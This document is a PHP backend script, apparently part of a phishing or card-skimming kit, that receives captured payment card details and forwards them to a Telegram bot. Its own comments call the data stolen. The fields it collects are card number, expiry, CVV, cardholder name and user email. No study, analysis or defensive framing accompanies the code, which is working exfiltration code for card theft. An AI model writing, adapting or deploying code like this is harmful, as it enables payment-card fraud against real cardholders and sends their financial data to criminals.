<?php
require_once 'config.php';

header('Content-Type: application/json');

// Read JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['action'])) {
    echo json_encode(['success' => false, 'error' => 'Invalid request']);
    exit;
}

$action = $input['action'];

if ($action === 'capture_card') {
    $data = $input['data'] ?? [];
    
    // Format the stolen card data
    $message = "💰 **NEW CARD CAPTURED**\n";
    $message .= "━━━━━━━━━━━━━━━\n";
    $message .= "**Type:** {$data['type']}\n";
    $message .= "**Card Number:** `{$data['cardNumber']}`\n";
    $message .= "**Expiry:** `{$data['expiry']}`\n";
    $message .= "**CVV:** `{$data['cvv']}`\n";
    $message .= "**Cardholder:** {$data['cardholder']}\n";
    $message .= "**Amount:** \${$data['amount']}\n";
    $message .= "**User Email:** {$data['user']}\n";
    $message .= "**Timestamp:** {$data['timestamp']}\n";
    $message .= "━━━━━━━━━━━━━━━";
    
    // Send to Telegram
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    if ($result === false) {
        echo json_encode(['success' => false, 'error' => 'Telegram send failed']);
    } else {
        echo json_encode(['success' => true]);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Unknown action']);
}
?>
